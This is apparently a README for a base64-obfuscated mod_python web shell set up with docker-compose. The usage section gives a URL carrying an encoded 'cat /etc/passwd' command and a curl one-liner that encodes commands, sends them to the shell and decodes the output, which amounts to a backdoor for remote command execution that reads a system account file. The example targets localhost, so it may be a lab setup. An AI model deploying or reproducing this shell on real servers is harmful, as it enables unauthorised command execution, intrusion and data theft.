# base64 mod_python webshell

## build
docker-compose up -d --build

## usage
http://localhost:8001/shell.py/main/?cmd=Y2F0IC9ldGMvcGFzc3dk

or

`echo cat /etc/passwd | tr -d "\n" | base64 | xargs -I {} curl -s http://localhost:8001/shell.py/main/?cmd={} | base64 -d`